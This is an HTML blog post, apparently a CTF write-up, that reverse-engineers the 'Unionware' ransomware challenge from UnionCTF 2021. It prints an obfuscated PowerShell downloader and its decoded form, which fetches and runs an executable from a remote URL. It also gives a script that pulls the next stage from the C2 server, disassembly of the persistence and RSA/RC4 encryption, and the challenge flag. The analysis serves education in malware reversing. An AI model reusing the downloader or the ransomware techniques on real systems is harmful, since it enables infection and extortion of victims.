@@ -1,0 +1,378 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>[Unionctf 2021 - RE] Unionware // ret2school</title>
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.68.3" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="nasm" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://ret2school.github.io/css/main.min.88e7083eff65effb7485b6e6f38d10afbec25093a6fac42d734ce9024d3defbd.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="[Unionctf 2021 - RE] Unionware"/>
+<meta name="twitter:description" content="UnionCTF - Unionware This challenge gives us two files: an &ldquo;unionware.ps1&rdquo; and a &ldquo;important_homework.txt.unionware&rdquo; containing seemingly random bytes. The challenge tells us that a ransomware encrypted the important homework and asks us to decrypt it.
+Analyzing the Powershell While looking at the powershell, we can see an obfuscated Powershell command, which seems to split some random string and then evaluating it. So, we&rsquo;ll just run the part of the script which deobfuscates the payload without executing it, which give us:"/>
+
+    <meta property="og:title" content="[Unionctf 2021 - RE] Unionware" />
+<meta property="og:description" content="UnionCTF - Unionware This challenge gives us two files: an &ldquo;unionware.ps1&rdquo; and a &ldquo;important_homework.txt.unionware&rdquo; containing seemingly random bytes. The challenge tells us that a ransomware encrypted the important homework and asks us to decrypt it.
+Analyzing the Powershell While looking at the powershell, we can see an obfuscated Powershell command, which seems to split some random string and then evaluating it. So, we&rsquo;ll just run the part of the script which deobfuscates the payload without executing it, which give us:" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://ret2school.github.io/post/unionware/" />
+<meta property="article:published_time" content="2021-02-22T00:00:00+00:00" />
+<meta property="article:modified_time" content="2021-02-22T00:00:00+00:00" />
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://ret2school.github.io"><img class="app-header-avatar" src="/pic.jpeg" alt="nasm" /></a>
+      <h1>ret2school</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             / 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+      </nav>
+      <p>Just a bunch of french ctf players</p>
+      <div class="app-header-social">
+        
+          <a target="_blank" href="https://github.com/ret2school" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg></a>
+        
+          <a target="_blank" href="https://twitter.com/nasm_re" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg></a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">[Unionctf 2021 - RE] Unionware</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Feb 22, 2021
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          8 min read
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line>
+</svg>
+              <a class="tag" href="https://ret2school.github.io/tags/ctf/">ctf</a>
+              <a class="tag" href="https://ret2school.github.io/tags/re/">RE</a>
+              <a class="tag" href="https://ret2school.github.io/tags/cr4/">cr4</a>
+              <a class="tag" href="https://ret2school.github.io/tags/supersnail/">supersnail</a>
+              <a class="tag" href="https://ret2school.github.io/tags/powershell/">powershell</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="unionctf---unionware">UnionCTF - Unionware</h1>
+<p>This challenge gives us two files: an &ldquo;unionware.ps1&rdquo; and a &ldquo;important_homework.txt.unionware&rdquo; containing seemingly random bytes. The challenge tells us that a ransomware encrypted the important homework and asks us to decrypt it.</p>
+<h2 id="analyzing-the-powershell">Analyzing the Powershell</h2>
+<p>While looking at the powershell, we can see an obfuscated Powershell command, which seems to split some random string and then evaluating it. So, we&rsquo;ll just run the part of the script which deobfuscates the payload without executing it, which give us:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">
+-joIN ( <span style="color:#f1fa8c">&#39;105%102n40%36n69M78%86M58:85%115a101_114M68n111:109u97C105n110C32n45M101a113C32n34:72O77O82C67u34O41u32u123a13:10_32H32n32M32:40u78_101H119n45u79%98%106H101O99n116C32H39:78H101n116C46M87H101u98O67_108M105H101M110M116C39n41M46M68n111u119u110O108n111M97n100M70n105H108O101u40%34:104n116u116n112a115M58u47C47M115a116n111C114M97n103a101M46a103C111a111u103O108C101%97a112u105_115n46_99M111n109_47M101M117n45:117C110_105H111H110%99H116_102O45u50u48C50u49O47u108n110n69M76:75:78n100O111H105a101:46n101_120M101n34M44O32C34C36_69n78M86_58a116n101u109O112H92H108_110a69_76%75%78a100a111:105u101_46:101n120%101:34C41O13M10a32u32u32u32M115n116M97n114u116%32n36O69M78u86M58_116:101n109a112:92a108O110M69a76M75O78C100a111:105u101:46M101u120C101%13:10n125&#39;</span> -spLIT<span style="color:#f1fa8c">&#39;a&#39;</span>-SPlIT<span style="color:#f1fa8c">&#39;n&#39;</span>-SPLit <span style="color:#f1fa8c">&#39;:&#39;</span>-spLiT <span style="color:#f1fa8c">&#39;u&#39;</span>-sPLIT <span style="color:#f1fa8c">&#39;%&#39;</span> -SpLiT <span style="color:#f1fa8c">&#39;O&#39;</span> -sPLiT <span style="color:#f1fa8c">&#39;H&#39;</span>-SpLit<span style="color:#f1fa8c">&#39;C&#39;</span> -SPLit<span style="color:#f1fa8c">&#39;M&#39;</span> -spLIt <span style="color:#f1fa8c">&#39;_&#39;</span> |%{ ( [ChAr][int]<span style="color:#8be9fd;font-style:italic">$_</span>)} )
+
+</code></pre></div><p>Unfortunately Windows Defender detects it as a malware, so we have to tell it to stfu, and then we get:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">
+<span style="color:#ff79c6">if</span>(<span style="color:#8be9fd;font-style:italic">$ENV:UserDomain</span> <span style="color:#ff79c6">-eq</span> <span style="color:#f1fa8c">&#34;HMRC&#34;</span>) {
+    (<span style="color:#8be9fd;font-style:italic">New-Object</span> <span style="color:#f1fa8c">&#39;Net.WebClient&#39;</span>).DownloadFile(<span style="color:#f1fa8c">&#34;https://storage.googleapis.com/eu-unionctf-2021/lnELKNdoie.exe&#34;</span>, <span style="color:#f1fa8c">&#34;$ENV:temp\lnELKNdoie.exe&#34;</span>)
+    <span style="color:#8be9fd;font-style:italic">start </span><span style="color:#8be9fd;font-style:italic">$ENV:temp</span>\lnELKNdoie.exe
+}
+
+</code></pre></div><p>The Powershell script is just a downloader for another executable we&rsquo;ll need to analyze</p>
+<h2 id="payload-analysis">Payload analysis</h2>
+<p>The executable is a 32-bit binary. The main function does a lot of anti-VM checks which were a bit annoying to bypass`, with function calls dynamically resolved through LoadLibrary/GetProcAddress with obfuscated strings.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">.text:00402177 loc_402177:                             ; CODE XREF: _main+6E↑j
+.text:00402177                 call    AntiVMCheck1
+.text:0040217C                 call    AntiVMCheck2
+.text:00402181                 call    AntiVMCheck3
+.text:00402186                 rdtsc
+.text:00402188                 mov     esi, eax
+.text:0040218A                 mov     edi, edx
+</code></pre></div><p>After some debugging in x64dbg, I figure outd that the malware checks if it&rsquo;s installed into HKCU\Software\Microsoft\Windows\CurrentVersion\Run under the REG_SZ value &ldquo;slkkmeLDDF&rdquo;. if not, it calls an install function to set up that key with the module path.</p>
+<p>Then it attempts to communicate with the CnC to download the next stage:</p>
+<pre><code>lea     ecx, [ebp-450h]
+mov     dword ptr [ebp-5FCh], 930956E3h
+push    ecx
+push    dword_40A3F8 ; should contain the port but ¯\_(ツ)_/¯
+mov     dword ptr [ebp-5F8h], 0FBACEEF3h
+lea     ecx, [ebp-600h] ; IP address decryption
+mov     dword ptr [ebp-5F4h], 2BBFDE68h
+mov     dword ptr [ebp-420h], 8E035C15h
+mov     dword ptr [ebp-41Ch], 0A22767D7h
+mov     dword ptr [ebp-418h], 0CD82D7C6h
+mov     dword ptr [ebp-414h], 2BBFDE5Ah
+movaps  xmm1, xmmword ptr [ebp-420h]
+pxor    xmm1, xmmword ptr [ebp-600h]
+push    ecx  ; contains the IP address of the CnC
+movaps  xmmword ptr [ebp-600h], xmm1
+call    eax
+</code></pre><p>Unfortunately, the &ldquo;dword_40A3F8&rdquo; which should point to the port string contains garbage&hellip; After some xrefing in IDA, we come across this function, which is called as __initterm callback (i.e. before main is called):</p>
+<pre><code>mov     dword ptr [esp+20h+var_20], 0B9306F24h
+lea     eax, [esp+20h+var_20]
+mov     dword ptr [esp+20h+var_20+4], 0A22767D7h
+mov     dword ptr [esp+20h+var_20+8], 0CD82D7C6h
+mov     dword ptr [esp+20h+var_20+0Ch], 2BBFDE5Ah
+mov     dword ptr [esp+20h+var_10], 8E035C15h
+mov     dword ptr [esp+20h+var_10+4], 0A22767D7h
+mov     dword ptr [esp+20h+var_10+8], 0CD82D7C6h
+mov     dword ptr [esp+20h+var_10+0Ch], 2BBFDE5Ah
+movaps  xmm1, [esp+20h+var_10]
+pxor    xmm1, [esp+20h+var_20]
+movaps  [esp+20h+var_20], xmm1
+mov     dword_40A3F8, eax
+</code></pre><p>The string is decrypted as &ldquo;1337&rdquo;, but unfortunately a pointer to a local variable in the function&rsquo;s stack frame is stored into dword_40A3F8, and this stack frame is overwritten by other function calls, leading to garbage.</p>
+<p>We know we need to connect to 35.241.159.62:1337</p>
+<p>After manually setting the correct port in x64dbg, we notice that the string <code>KADMKLAFD:LSM$OPM@FLK:FM!N$@N$</code> is sent to the server, and then another annoying anti-debug trick hits us again. So let&rsquo;s connect to the server, send this string and see what&rsquo;s happens (yes it&rsquo;s ugly and you have to it ctrl+C to stop the script):</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">
+<span style="color:#ff79c6">import</span> socket
+
+s <span style="color:#ff79c6">=</span> socket<span style="color:#ff79c6">.</span>socket(socket<span style="color:#ff79c6">.</span>AF_INET,socket<span style="color:#ff79c6">.</span>SOCK_STREAM)
+<span style="color:#6272a4"># 159.65.197.149</span>
+s<span style="color:#ff79c6">.</span>connect((<span style="color:#f1fa8c">&#34;35.241.159.62&#34;</span>, <span style="color:#bd93f9">1337</span>))
+zgueg <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;KADMKLAFD:LSM$OPM@FLK:FM!N$@N$&#34;</span>
+s<span style="color:#ff79c6">.</span>send(zgueg)
+buf <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>
+f <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">open</span>(<span style="color:#f1fa8c">&#34;shlag.bin&#34;</span>, <span style="color:#f1fa8c">&#34;wb&#34;</span>)
+<span style="color:#ff79c6">while</span> True:
+    tmp <span style="color:#ff79c6">=</span> s<span style="color:#ff79c6">.</span>recv(<span style="color:#bd93f9">0x200</span>)
+    f<span style="color:#ff79c6">.</span>write(tmp)
+f<span style="color:#ff79c6">.</span>close()
+
+</code></pre></div><p>After running the script, we get a nice PE file waiting to be reversed :)</p>
+<h2 id="analysis-of-the-server-payload">Analysis of the server payload</h2>
+<p>We finally reach the final payload. After a quick inspection in IDA, smells ransomware:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">.text:00411FEF loc_411FEF:                             ; CODE XREF: WinMain(x,x,x,x)+353↑j
+.text:00411FEF                 lea     edx, [ebp+ppszPath]
+.text:00411FF5                 push    edx             ; ppszPath
+.text:00411FF6                 push    0               ; hToken
+.text:00411FF8                 push    0               ; dwFlags
+.text:00411FFA                 push    offset rfid     ; rfid
+.text:00411FFF                 call    ds:SHGetKnownFolderPath
+.text:00412005                 mov     eax, 4
+.text:0041200A                 imul    ecx, eax, 0
+.text:0041200D                 mov     edx, [ebp+ecx+ppszPath]
+.text:00412014                 push    edx             ; Src
+.text:00412015                 lea     ecx, [ebp+var_5AC]
+.text:0041201B                 call    sub_412C10
+.text:0041201B ;   } // starts at 411FC5
+.text:00412020 ;   try {
+.text:00412020                 mov     byte ptr [ebp+var_4], 0Fh
+.text:00412024                 push    offset aImportantReadm ; &#34;\\IMPORTANT_README.txt&#34;
+</code></pre></div><p>Since it&rsquo;s C++ stuff with a lot of junk &ldquo;proxy&rdquo; function around STL objects (std::string, std::vector and recursive_directory_iterator), let&rsquo;s check what happens in x86dbg. The function enumerates all files into the &ldquo;C:\Users\&lt;username&gt;\Documents\j3w3ls directory, checks if the file size is above 200 bytes and if so, adds it to the &ldquo;to encrypt&rdquo; list. So to trigger the ransomware, let&rsquo;s create the &ldquo;j3w3ls&rdquo; directory and put a junk file in it, before restarting the debugging.</p>
+<p>We come across an interesting loop:</p>
+<pre><code>.text:00411ECF                 call    getfilename
+.text:00411ED4                 mov     [ebp+filename], eax
+.text:00411EDA                 mov     eax, [ebp+filename]
+.text:00411EE0                 push    eax
+.text:00411EE1                 lea     ecx, [ebp+pbuffer]
+.text:00411EE7                 push    ecx
+.text:00411EE8                 call    readbuf
+.text:00411EED                 add     esp, 8
+.text:00411EF0                 mov     [ebp+ppbuf], eax
+.text:00411EF6                 mov     edx, [ebp+ppbuf]
+.text:00411EFC                 push    edx             ; struct std::_Fake_allocator *
+.text:00411EFD                 lea     ecx, [ebp+var_54C]
+.text:00411F03                 call    alloc_stuff
+.text:00411F08                 lea     ecx, [ebp+pbuffer]
+.text:00411F0E                 call    vector_destroy
+.text:00411F13                 lea     eax, [ebp+var_54C]
+.text:00411F19                 push    eax
+.text:00411F1A                 lea     ecx, [ebp+var_628]
+.text:00411F20                 push    ecx
+.text:00411F21                 call    EncryptionHappensHere
+</code></pre><p>The &ldquo;EncryptionHappensHere&rdquo; function does a lot of crypto++ wizardry (I spent a lot of time identifying Crypto++ parts of the bin): it generates a private RSA key from a random pool, then sends it to the CnC:</p>
+<pre><code>.text:0040639D                 lea     ecx, [ebp+randomGenerator]
+.text:004063A3                 call    CreateAutoSeededRandomPool
+.text:004063A8                 mov     [ebp+stepCounter], 0
+.text:004063AF                 push    10Ch            ; Size
+.text:004063B4                 lea     ecx, [ebp+privkey]
+.text:004063BA                 call    zeromem
+.text:004063BF                 push    1               ; int
+.text:004063C1                 lea     ecx, [ebp+privkey]
+.text:004063C7                 call    InvertibleRSAFunction__ctor
+.text:004063CC                 mov     byte ptr [ebp+stepCounter], 1
+.text:004063D0                 lea     eax, [ebp+privkey+44h]
+.text:004063D6                 mov     [ebp+privkeyObj], eax
+.text:004063DC                 push    400h            ; keyBits
+.text:004063E1                 lea     ecx, [ebp+randomGenerator]
+.text:004063E7                 push    ecx             ; randomGenerator
+.text:004063E8                 mov     ecx, [ebp+privkeyObj]
+.text:004063EE                 call    InvertibleRSAFunction__Initialize
+[...]
+.text:00406428                 push    1
+.text:0040642A                 lea     eax, [ebp+privkey]
+.text:00406430                 push    eax
+.text:00406431                 lea     ecx, [ebp+generated_pubk]
+.text:00406437                 call    RSAFunction__RSAFunction
+.text:0040643C                 mov     byte ptr [ebp+stepCounter], 3
+.text:00406440                 lea     ecx, [ebp+privkeyDer]
+.text:00406443                 call    new_std_string
+.text:00406448                 mov     byte ptr [ebp+stepCounter], 4
+.text:0040644C                 push    14h             ; Size
+.text:0040644E                 lea     ecx, [ebp+output]
+.text:00406451                 call    zeromem
+.text:00406456                 lea     ecx, [ebp+privkeyDer]
+.text:00406459                 push    ecx
+.text:0040645A                 lea     ecx, [ebp+output] ; output
+.text:0040645D                 call    StringSinkTemplate__StringSinkTemplate
+.text:00406462                 mov     byte ptr [ebp+stepCounter], 5
+.text:00406466                 lea     edx, [ebp+privKeyCopy]
+.text:0040646C                 push    edx
+.text:0040646D                 lea     eax, [ebp+output]
+.text:00406470                 push    eax
+.text:00406471                 call    EncodePrivateKey
+.text:00406476                 add     esp, 8
+.text:00406479                 lea     ecx, [ebp+privkeyDer]
+.text:0040647C                 push    ecx
+.text:0040647D                 call    SendKeyToCC
+</code></pre><p>Then the funny stuff begins. The functions creates a public key from the generated private key, uses it to construct a RSAES_OAEP_SHA_Encryptor from the public key.
+Then it constructs an ArraySink from a STL vector&rsquo;s buffer, which is passed as a bufferedTransformation to the PK_EncryptorFilter. This EncryptorFilter will be then given to the StringSource which will read the 86 first bytes of the string:</p>
+<pre><code>mov     ecx, [ebx+0Ch]
+call    string_getdata
+mov     [ebp+file_contents_buf], eax
+mov     ecx, [ebp+encFilter_temp3]
+push    ecx             ; transformation
+push    1               ; pumpAll
+push    86              ; length
+mov     edx, [ebp+file_contents_buf]
+push    edx             ; zstring
+lea     ecx, [ebp+stringsource]
+call    CreateStringSource
+</code></pre><p>In C++, this would give something like this:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">
+<span style="color:#6272a4">// filebuf is a std::string passed as argument
+</span><span style="color:#6272a4">// pub_from_privkey is the public key derived from the random privkey
+</span><span style="color:#6272a4">// rng is the random pool seen above
+</span><span style="color:#6272a4"></span>std<span style="color:#ff79c6">::</span>vector<span style="color:#ff79c6">&lt;</span><span style="color:#8be9fd">char</span><span style="color:#ff79c6">&gt;</span> encrypted;
+encrypted.resize(<span style="color:#bd93f9">0x80</span>);
+RSAES_OAEP_SHA_Encryptor <span style="color:#50fa7b">e</span> (pub_from_privkey);
+source <span style="color:#ff79c6">=</span> StringSource(
+    filebuf.c_str(),
+    <span style="color:#bd93f9">86</span>,
+    <span style="color:#8be9fd;font-style:italic">true</span>,
+    <span style="color:#ff79c6">new</span> PK_EncryptorFilter(
+        rng,
+        e,
+        <span style="color:#ff79c6">new</span> ArraySink(<span style="color:#ff79c6">&amp;</span>encrypted[<span style="color:#bd93f9">0</span>], <span style="color:#bd93f9">0x80</span>)
+    ));
+
+</code></pre></div><p>After the call, our &ldquo;encrypted&rdquo; contains the encrypted 86 first bytes of the file. Then, after doing some output string initialization, it does:</p>
+<pre><code>mov     ecx, [ebx+0Ch]
+call    string_getsize
+sub     eax, 56h
+push    eax
+lea     ecx, [ebp+rc4_enc_buf]
+call    str_resize
+lea     eax, [ebp+rc4_enc_buf]
+push    eax             ; outStr
+mov     ecx, [ebx+0Ch]
+push    ecx             ; clearStr
+lea     edx, [ebp+rsaEncrypted_vec]
+push    edx             ; rc4key
+call    RC4Encryption
+add     esp, 0Ch
+</code></pre><p>The RC4 encryption function was easy to identify, thanks to its key scheduling function at 0x00405E50 called by RC4Encryption. Now, we know that RSA_OAEP(fileBuf[0:56]) is the RC4 key to encrypt the rest of the file. Now, let&rsquo;s check where the key is saved into the encrypted file, so we may recover the whole file minus the 56 first bytes.</p>
+<p>We get a first copy loop, which copies the RSA-encrypted buffer into the return buffer:</p>
+<pre><code>.text:0040667C                 jmp     short loop1
+.text:0040667E ; ------------------------------------------------------------
+.text:0040667E
+.text:0040667E loop1_next:                             ; CODE XREF: EncryptionHappensHere+387↓j
+.text:0040667E                 mov     eax, [ebp+counter]
+.text:00406684                 add     eax, 1
+.text:00406687                 mov     [ebp+counter], eax
+.text:0040668D
+.text:0040668D loop1:                                  ; CODE XREF: EncryptionHappensHere+33C↑j
+.text:0040668D                 cmp     [ebp+counter], 80h
+.text:00406697                 jge     short loop1_finished
+.text:00406699                 mov     ecx, [ebp+counter]
+.text:0040669F                 push    ecx
+.text:004066A0                 lea     ecx, [ebp+rsaEncrypted_vec]
+.text:004066A3                 call    vector_getdata
+.text:004066A8                 mov     dl, [eax]
+.text:004066AA                 mov     [ebp+tmp], dl
+.text:004066B0                 mov     eax, [ebp+counter]
+.text:004066B6                 push    eax
+.text:004066B7                 lea     ecx, [ebp+outbuffer]
+.text:004066BA                 call    vector_getdata
+.text:004066BF                 mov     cl, [ebp+tmp]
+.text:004066C5                 mov     [eax], cl
+.text:004066C7                 jmp     short loop1_next
+</code></pre><p>Then, we get a second loop which copies the RC4-encrypted buffer:</p>
+<pre><code>.text:004066C9 loop1_finished:                         ; CODE XREF: EncryptionHappensHere+357↑j
+.text:004066C9                 mov     [ebp+counter2], 80h
+.text:004066D3                 jmp     short loop2
+.text:004066D5 ; ---------------------------------------------------------------------------
+.text:004066D5
+.text:004066D5 loop2_next:                             ; CODE XREF: EncryptionHappensHere+3E7↓j
+.text:004066D5                 mov     edx, [ebp+counter2]
+.text:004066DB                 add     edx, 1
+.text:004066DE                 mov     [ebp+counter2], edx
+.text:004066E4
+.text:004066E4 loop2:                                  ; CODE XREF: EncryptionHappensHere+393↑j
+.text:004066E4                 lea     ecx, [ebp+outbuffer]
+.text:004066E7                 call    string_getsize
+.text:004066EC                 cmp     [ebp+counter2], eax
+.text:004066F2                 jnb     short loopEnd
+.text:004066F4                 mov     eax, [ebp+counter2]
+.text:004066FA                 sub     eax, 80h
+.text:004066FF                 push    eax
+.text:00406700                 lea     ecx, [ebp+rc4_enc_buf]
+.text:00406703                 call    vector_getdata
+.text:00406708                 mov     cl, [eax]
+.text:0040670A                 mov     [ebp+tmp2], cl
+.text:00406710                 mov     edx, [ebp+counter2]
+.text:00406716                 push    edx
+.text:00406717                 lea     ecx, [ebp+outbuffer]
+.text:0040671A                 call    vector_getdata
+.text:0040671F                 mov     cl, [ebp+tmp2]
+.text:00406725                 mov     [eax], cl
+.text:00406727                 jmp     short loop2_next
+.text:00406729 ; ---------------------------------------------------------------------------
+.text:00406729
+.text:00406729 loopEnd:                                ; CODE XREF: EncryptionHappensHere+3B2↑j
+.text:00406729                 lea     edx, [ebp+outbuffer]
+</code></pre><p>Then, the program does some cleanup, before returning to the caller, which writes the encrypted content into the file.</p>
+<p>Now, we can write a Python script to recover most of the file:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">
+<span style="color:#ff79c6">from</span> Crypto.Cipher <span style="color:#ff79c6">import</span> ARC4
+
+f <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">open</span>(<span style="color:#f1fa8c">&#34;important_homework.txt.unionware&#34;</span>, <span style="color:#f1fa8c">&#34;rb&#34;</span>)
+buf <span style="color:#ff79c6">=</span> f<span style="color:#ff79c6">.</span>read()
+
+k <span style="color:#ff79c6">=</span> buf[<span style="color:#bd93f9">0</span>:<span style="color:#bd93f9">0x80</span>]
+blop <span style="color:#ff79c6">=</span> ARC4<span style="color:#ff79c6">.</span>new(k)
+rofl <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">open</span>(<span style="color:#f1fa8c">&#34;out.txt&#34;</span>, <span style="color:#f1fa8c">&#34;wb&#34;</span>)
+rofl<span style="color:#ff79c6">.</span>write(blop<span style="color:#ff79c6">.</span>decrypt(buf[<span style="color:#bd93f9">0x80</span>:]))
+
+</code></pre></div><p>And after searching the &ldquo;{&rdquo; char in the file, we finally get the flag: <code>union{d1d_y0u_g3t_m3_th0s3_cr0wn_j3w3ls?}</code>.</p>
+<p>That&rsquo;s all folks ! :þ</p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
